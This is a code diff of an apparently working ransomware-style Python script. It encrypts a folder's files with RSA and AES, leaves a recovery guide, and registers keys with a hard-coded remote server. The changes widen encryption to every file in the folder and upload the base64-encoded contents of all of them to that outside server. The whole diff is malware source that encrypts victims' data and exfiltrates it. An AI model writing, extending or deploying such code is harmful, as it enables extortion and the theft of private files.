@@ -3,11 +3,13 @@ import uuid
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Random import get_random_bytes
+# from sympy import content
 from keyclient import KeyClient
 import base64
 import shutil
 
-FILE = ".machine_id"
+server_url = os.getenv("SERVER_URL", "http://13.237.202.163:8000")
+FILE = os.getenv("NAME_FILE_ID", ".env.example")
 
 
 def get_machine_id():
@@ -24,7 +26,7 @@ def get_machine_id():
 class HybridCrypto:
     def __init__(self):
         self.client = KeyClient(
-            server_url="http://13.237.202.163:8000",
+            server_url=server_url,
             machine_id=get_machine_id()
         )
 
@@ -32,7 +34,7 @@ class HybridCrypto:
 
         print("[INFO - excute] Generating RSA private key")
         self.private_key = RSA.generate(2048)
-        print("[INFO - excute] RSA private key generated", self.private_key.export_key())
+        print("[INFO - excute] RSA private key generated\n", self.private_key.export_key())
 
         self.aes_key = None
 
@@ -104,10 +106,10 @@ class HybridCrypto:
         content = []
 
         for f in os.listdir(folder):
-            if f.endswith(".txt"):
-                full = os.path.join(folder, f)
+            full = os.path.join(folder, f)
 
-                with open(full, "r", encoding="utf-8") as file:
+            if os.path.isfile(full):
+                with open(full, "rb") as file:
                     file_content = file.read()
 
                 content.append(file_content)
@@ -116,7 +118,9 @@ class HybridCrypto:
         self.client.add_aes_key(
             machine_id=self.client.machine_id,
             aes_key=aes_key_base64,
-            content="\n".join(content)
+            content = base64.b64encode(
+                b"\n".join(content)
+            ).decode("utf-8")
         )
 
         return results
@@ -131,15 +135,16 @@ class HybridCrypto:
             f.write("4. Run the .exe + directory of encrypted files as argument\n")
             f.write("GOOD LUCK!")
         
-        shutil.copy(guide_path, os.path.join(folder, "HOW_TO_REVERT.txt"))
+        # shutil.copy(guide_path, os.path.join(folder, "HOW_TO_REVERT.txt"))
         print("[INFO - excute] Guide added to sandbox folder")
 
 
 if __name__ == "__main__":
     scaned_folder = "sandbox"
     crypto = HybridCrypto()
-    files = crypto.encrypt_sandbox(scaned_folder)
     crypto.add_guide(scaned_folder)
+    files = crypto.encrypt_sandbox(scaned_folder)
+    
 
     print("[INFO - excute] Encryption completed. Encrypted files:")
     print("\n".join(files))
